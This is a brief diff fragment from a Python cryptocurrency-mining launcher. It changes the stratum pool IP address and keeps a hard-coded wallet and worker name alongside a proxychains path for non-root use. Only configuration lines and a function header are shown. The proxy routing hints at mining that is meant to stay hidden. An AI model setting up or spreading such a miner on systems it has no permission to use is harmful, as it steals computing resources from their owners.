@@ -2,7 +2,7 @@
 import subprocess, time, os, signal, random
 
 WALLET = "scash1qssvy8a0lrueh25j2rkzuv2lmsalgaemc6szj52.Danis"
-POOL = "stratum+tcp://146.59.217.34:17019"
+POOL = "stratum+tcp://104.248.171.56:8291"
 PROXY = ["./proxychains4"]  # Non-root proxychains dummy path
 
 def start_miner():
